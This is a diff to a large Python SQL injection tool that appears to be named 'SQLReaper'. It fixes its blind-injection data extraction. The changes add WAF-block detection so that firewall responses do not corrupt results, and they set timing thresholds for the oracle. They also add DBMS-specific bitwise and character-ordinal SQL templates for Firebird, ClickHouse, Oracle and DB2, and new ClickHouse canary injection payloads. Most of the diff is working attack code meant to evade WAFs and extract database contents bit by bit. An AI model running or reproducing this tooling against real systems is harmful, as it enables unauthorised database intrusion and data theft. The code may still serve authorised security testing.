@@ -67228,9 +67228,21 @@ class Scanner:
                          _body_gap, _min_gap, _page_size)
                 return False
 
+        # BUG-V217-THRESH-UNSET-BODY-ORACLE FIX (HIGH): _thresh was only assigned inside
+        # `if not _use_bool_body_oracle`, leaving it undefined when body oracle is active.
+        # _eval_d_bw (used by _extract_s_bitwise) always accesses `_thresh` for its timing
+        # comparison `ms >= _thresh`.  When both _use_bool_body_oracle=True AND
+        # _waf_blocks_gt=True (bitwise path entered), the NameError propagated out of
+        # _extract_s_bitwise silently via the enclosing exception handler, producing an empty
+        # extraction result instead of a meaningful fallback attempt.
+        # Fix: always compute _thresh from calibration measurements regardless of oracle mode.
+        # _eval_d_bw is a timing oracle; even when body oracle is primary for binary search,
+        # the bitwise timing path can still work if WAF doesn't block bitwise operators.
+        _thresh = (ms_t + ms_f) / 2
         if not _use_bool_body_oracle:
-            _thresh = (ms_t + ms_f) / 2
             LOG.info("[Direct] Viable! thresh=%.0fms delay=%.1fs (inverted=%s)", _thresh, _delay, _d_oracle_inverted)
+        else:
+            LOG.info("[Direct] thresh=%.0fms (body-oracle primary, timing threshold for bitwise fallback only)", _thresh)
         _de_cdn_step_delay = 0.0  # Reactive retry in _send_d_timed handles CDN automatically
 
         async def _eval_d(cond):
@@ -67240,6 +67252,19 @@ class Scanner:
             # compare body size against the calibration threshold instead of timing.
             if _use_bool_body_oracle:
                 if fp is None:
+                    return None
+                # BUG-V217-BODY-ORACLE-WAF-BLOCK FIX (MEDIUM-HIGH): The body-size oracle path
+                # lacked a WAFBlockDiscriminator guard present in the timing path below.
+                # Scenario: calibration hit a behavioral-timing WAF (blocks on SLEEP execution)
+                # → body oracle activated via _cal_true_waf_blocked.  Char extraction probes
+                # then hit a PATTERN WAF rule (ASCII/SUBSTRING keywords) → WAF error page
+                # returned regardless of SQL condition → body size is constant (WAF page size)
+                # → oracle evaluates to the same constant for every probe → binary search
+                # converges to lo=255 → chr(255)='ÿ' garbage for every extracted character.
+                # Fix: identical to timing path — if WAFBlockDiscriminator flags the response,
+                # return None so the caller falls through to _fallback_equality/_fallback_modbit
+                # which use MOD/FLOOR operators less likely to trigger the pattern rule.
+                if WAFBlockDiscriminator.is_waf_block(fp):
                     return None
                 _b = len(getattr(fp, 'body', b'') or b'')
                 if _bool_true_larger:
@@ -67803,6 +67828,15 @@ class Scanner:
                               "WAF block, NOT CDN cache hit; skipping CDN sleep", ms, _fp_bw_sc)
                 if fp is None or ms < 30:
                     return None
+                # BUG-V217-EVAL-D-BW-WAF-BLOCK FIX (MEDIUM): _eval_d_bw lacked the
+                # WAFBlockDiscriminator guard present in _eval_d's timing path.
+                # When a WAF applies consistent throttle latency (e.g. 338ms) to all
+                # bitwise probes regardless of SQL condition, and _thresh < 338ms,
+                # the oracle always returns True → all bits set → chr(127)/garbage.
+                # Fix: mirror the same guard from _eval_d's timing path — return None
+                # on WAF block so the bit is treated as inconclusive and retried.
+                if fp is not None and WAFBlockDiscriminator.is_waf_block(fp):
+                    return None
                 return ms >= _thresh
 
             _de_bw_ascii = {
@@ -67812,6 +67846,16 @@ class Scanner:
                 "Oracle":   "NVL(ASCII(SUBSTR(({e}),{p},1)),0)",
                 "MySQL":    "ORD(SUBSTRING(({e}),{p},1))",
                 "MariaDB":  "ORD(SUBSTRING(({e}),{p},1))",
+                # BUG-V217-EXTRACT-BITWISE-DE-BW-MISSING-DBMS FIX: Firebird and ClickHouse
+                # were absent from _de_bw_ascii → fell to the generic COALESCE(ASCII(SUBSTRING))
+                # template which is invalid SQL in both DBMSes:
+                #   Firebird: SUBSTRING requires "FROM … FOR …" keyword syntax, not comma syntax.
+                #     ASCII_VAL() is the Firebird-specific ordinal function.
+                #   ClickHouse: function names are case-sensitive; uppercase ASCII/SUBSTRING
+                #     raise "Unknown function" errors. Must use lowercase ascii/substring.
+                # Missing entries produced SQL errors → oracle dead → empty bitwise extraction.
+                "Firebird":  "ASCII_VAL(SUBSTRING(({e}) FROM {p} FOR 1))",
+                "ClickHouse": "ascii(substring(({e}),{p},1))",
             }
             _de_bw_tpl = _de_bw_ascii.get(_dbms, "COALESCE(ASCII(SUBSTRING(({e}),{p},1)),0)")
 
@@ -67848,7 +67892,22 @@ class Scanner:
                     _ascii_e = _de_bw_tpl.format(e=expr, p=_pos)
                     for _cb in range(6, -1, -1):  # bits 6..0 (printable ASCII 32-126)
                         _mask = 1 << _cb
-                        _bit_cond = f"({_ascii_e})&{_mask}={_mask}"
+                        # BUG-V217-EXTRACT-BITWISE-INFIX-ORACLE FIX (MEDIUM): char-level
+                        # bitwise conditions always used `&` infix operator for every DBMS,
+                        # while length detection (above) already dispatched per-DBMS correctly.
+                        # Oracle and DB2 do not support `&` as a bitwise operator — BITAND() is
+                        # required.  Firebird requires BIN_AND().  ClickHouse requires bitAnd()
+                        # (case-sensitive).  Using `&` on these DBMSes raises a SQL syntax error
+                        # → oracle returns None for every bit → extraction yields empty string.
+                        # Fix: mirror the per-DBMS dispatch pattern from length detection above.
+                        if _dbms in ("Oracle", "DB2", "Sybase"):
+                            _bit_cond = f"BITAND({_ascii_e},{_mask})={_mask}"
+                        elif _dbms == "Firebird":
+                            _bit_cond = f"BIN_AND({_ascii_e},{_mask})={_mask}"
+                        elif _dbms == "ClickHouse":
+                            _bit_cond = f"bitAnd({_ascii_e},{_mask})={_mask}"
+                        else:
+                            _bit_cond = f"({_ascii_e})&{_mask}={_mask}"
                         _cr = await _eval_d_bw(_bit_cond)
                         if _cr is None:
                             return _bw_result  # oracle dead, return what we have
@@ -117095,6 +117154,13 @@ class TechniqueCascadeEngine:
                         "Sybase":     " AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Oracle":     " AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "SQLite":     " AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        # BUG-V217-CHECKE-CLICKHOUSE-CASE FIX: ClickHouse was absent → fell to
+                        # PostgreSQL default which uses uppercase SUBSTRING/LENGTH/UPPER.
+                        # ClickHouse is case-sensitive for function names — uppercase variants
+                        # raise "Unknown function SUBSTRING" → SQL error → empty canary body
+                        # → _e_direct_sim ≈ 0 → Check E always fails for genuine ClickHouse
+                        # injection.  Use lowercase ClickHouse-native function names.
+                        "ClickHouse": " AND substring('SQLReaper',1,1)='S' AND length('SQLReaper')=9 AND upper('a')='A'-- -",
                     }
                 else:
                     payloads = {
@@ -117111,6 +117177,8 @@ class TechniqueCascadeEngine:
                         "Sybase":     "' AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Oracle":     "' AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "SQLite":     "' AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        # BUG-V217-CHECKE-CLICKHOUSE-CASE FIX: see numeric_ctx branch above.
+                        "ClickHouse": "' AND substring('SQLReaper',1,1)='S' AND length('SQLReaper')=9 AND upper('a')='A'-- -",
                     }
                 # BUG-CHECK-E-UNKNOWN-DBMS FIX: MySQL probe includes BENCHMARK() which
                 # is MySQL-specific; using it as the default causes a syntax error on
@@ -146792,8 +146860,21 @@ class SideChannelExtractor:
             return f"COALESCE(UNICODE(SUBSTRING(({expr}),{pos},1)),0)>={threshold}"
         elif self.dbms == "SQLite":
             return f"COALESCE(UNICODE(SUBSTR(({expr}),{pos},1)),0)>={threshold}"
+        elif self.dbms == "Firebird":
+            # BUG-V217-SCE-CHAR-ORD-MISSING-DBMS FIX: Firebird uses ASCII_VAL() not ASCII().
+            # ASCII() does not exist in Firebird → SQL error on every binary-search probe →
+            # oracle always returns None/False → extraction produces empty string.
+            # ASCII_VAL(str) returns the ASCII value of the first character (Firebird 2+).
+            # SUBSTR(str, start, len) 3-arg form is valid in Firebird 2.1+.
+            return f"COALESCE(ASCII_VAL(SUBSTR(({expr}),{pos},1)),0)>={threshold}"
+        elif self.dbms == "ClickHouse":
+            # BUG-V217-SCE-CHAR-ORD-MISSING-DBMS FIX: ClickHouse function names are
+            # case-sensitive. ASCII/SUBSTR/COALESCE (uppercase) are not ClickHouse built-ins
+            # → "Unknown function" error on every probe → extraction fails silently.
+            # ClickHouse built-ins: ascii(), substring(), coalesce() (all lowercase).
+            return f"coalesce(ascii(substring(({expr}),{pos},1)),0)>={threshold}"
         else:
-            # PostgreSQL, CockroachDB, YugabyteDB, Amazon Redshift, Oracle, etc.
+            # PostgreSQL, CockroachDB, YugabyteDB, Amazon Redshift, Oracle, DB2, etc.
             return f"COALESCE(ASCII(SUBSTR(({expr}),{pos},1)),0)>={threshold}"
 
     async def extract_where_error(self, sql, max_len=64):
